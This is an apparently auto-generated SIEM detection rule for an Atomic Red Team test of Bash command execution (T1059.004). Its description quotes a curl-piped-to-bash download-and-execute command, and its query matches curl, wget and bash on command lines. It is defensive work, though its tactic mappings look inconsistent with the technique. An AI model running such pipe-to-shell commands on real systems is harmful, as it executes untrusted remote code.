[rule]
author = [ "AtomicRedTeam-Automation",]
description = "Detection for specific test 'Command-Line Interface' (GUID: d0c88567-803d-4dca-99b4-7ce65e7b257c) of technique T1059.004 (Command and Scripting Interpreter: Bash). Test Description: Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.. Command/Steps: curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://..."
from = "now-9m"
rule_id = "6bcc02f9-c2a2-48b9-86f2-8d9323711d94"
language = "kql"
name = "Atomic Test: T1059.004 - Command-Line Interface"
output_index = ".siem-signals-default"
references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1059.004/T1059.004.yaml",]
risk_score = 50
severity = "medium"
tags = [ "AtomicRedTeam", "T1059.004", "d0c88567-803d-4dca-99b4-7ce65e7b257c", "linux", "macos",]
type = "query"
query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*curl*\\\" AND process.command_line : \\\"*bash*\\\" AND process.command_line : \\\"*wget*\\\""
version = 1
index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1059.004"
name = "Command-Line Interface"
reference = "https://attack.mitre.org/techniques/T1059/004"

[[rule.threat.tactic]]
id = "TA0003"
name = "Persistence"
reference = "https://attack.mitre.org/techniques/T1059/004"

[[rule.threat.tactic]]
id = "TA0004"
name = "Privilege Escalation"
reference = "https://attack.mitre.org/techniques/T1059/004"

[[rule.threat.tactic]]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/techniques/T1059/004"


